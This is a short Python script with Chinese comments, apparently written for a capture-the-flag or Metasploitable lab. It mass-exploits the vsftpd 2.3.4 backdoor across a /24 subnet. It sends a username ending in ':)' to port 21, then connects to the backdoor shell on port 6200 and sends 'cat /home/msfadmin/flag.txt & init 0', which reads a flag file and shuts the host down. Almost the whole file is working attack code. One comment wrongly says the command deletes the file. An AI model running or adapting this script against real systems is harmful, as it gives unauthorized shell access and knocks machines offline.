# -*- coding = utf-8 -*-
# @Time:2022/6/19 上午 文件检查文件:52
# @Author:CK
# @File:扫网段
# @Software:PyCharm
import socket # 导入socket这个模块
import threading,time # 导入threading和time这两个模块

def check(ip): # 自定义一个函数
    try: # 尝试运行
        a=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 实例化一个socket对象
        a.connect((ip,21)) # 锁定ip和端口
        a.settimeout(0.1) # 如果一个请求1秒没有完成，就终止，再次发起请求。
        a.sendall(b'USER root:)\n') # 输入账号
        a.sendall(b'PASS 132\n') # 输入密码
    except: # 尝试后失败则
         pass # 跳过
def exploit(ip): # 自定义一个函数
    try: # 尝试运行
        b=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 实例化一个socket对象
        b.connect((ip,6200)) # 锁定IP和端口
        b.settimeout(0.1) # 如果一个请求超过1秒没有完成，就终止，再次发起请求。
        b.sendall(b'cat /home/msfadmin/flag.txt & init 0\n') #查看这个文件，并删除这个文件，然后关机
        flag=b.recv(1028) # 设置最大的读取数量的大小
        b.close()
        print('ip:',ip,'',flag.strip()) # 打印结果
    except: # 尝试运行失败后
        pass # 就跳过
if __name__ == '__main__': #为了调试当前执行的模块的正确性；__name__ 代表的就是当前执行的模块名；如果模块是被直接运行的，则代码块被运行，如果模块被import，则代码块不被运行。
    for i in range(0,254):
        ip = '172.16.81.' + str(i)# 锁定对方的IP
        c=threading.Thread(target=check,args=(ip,)) #check(ip)，控制线程
        d=threading.Thread(target=exploit,args=(ip,)) #exploit(ip)，控制线程
        c.start() # 启动该线程运行
        time.sleep(0.01) # 停一秒再运行下面的线程
        d.start() # 启动该线程